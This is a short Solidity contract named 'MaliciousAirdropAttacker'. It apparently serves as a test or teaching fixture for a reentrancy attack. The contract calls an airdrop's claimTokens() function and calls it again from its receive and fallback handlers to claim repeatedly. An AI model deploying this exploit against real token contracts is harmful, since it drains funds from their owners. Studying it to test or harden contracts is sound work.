// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IAirdrop {
    function claimTokens() external;
}

contract MaliciousAirdropAttacker {
    IAirdrop public airdrop;

    constructor(address _airdrop) {
        airdrop = IAirdrop(_airdrop);
    }

    receive() external payable {
        if (gasleft() > 100000) {
            airdrop.claimTokens();
        }
    }

    fallback() external payable {
        if (gasleft() > 100000) {
            airdrop.claimTokens();
        }
    }

    function attack() external {
        airdrop.claimTokens();
    }
}